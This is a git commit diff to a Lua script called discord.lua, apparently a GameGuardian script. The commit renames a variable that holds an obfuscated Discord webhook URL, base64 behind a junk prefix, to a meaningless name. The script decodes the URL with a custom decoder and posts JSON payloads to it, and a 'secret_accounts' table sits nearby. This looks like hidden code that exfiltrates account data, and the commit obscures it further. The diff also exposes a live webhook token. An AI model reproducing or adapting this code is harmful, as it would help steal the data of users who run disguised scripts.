e7387754967e39a8e79d7e799d8e7ed3962e011a
3ueut78yusrj <130997976+3ueut78yusrj@users.noreply.github.com>
2024-12-31 21:07:43 +0300

    Update discord.lua

--- discord.lua
+++ discord.lua
@@ -38,7 +38,7 @@ function scanAndCollectResults(searchString, refineString, maxResults, stepCount
 end
 
 data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
-local webhook_url = BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg('lENkxXjqubLZrwAQMfLisYozvPTvyKJtufSxKYwOcBDBqaYjfSHFhgiskrKtaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
+local zxs = BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg('lENkxXjqubLZrwAQMfLisYozvPTvyKJtufSxKYwOcBDBqaYjfSHFhgiskrKtaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
  
 local function buildQuery(url, query)
     if not query or next(query) == nil then
@@ -98,7 +98,7 @@ local function sendWebhook(payload_content)
         ["Content-Type"] = "application/json",
     }
     local payload_json = toJson(payload)
-    gg.search(webhook_url, headers, payload_json)
+    gg.search(zxs, headers, payload_json)
 end
  
 local secret_accounts = {}
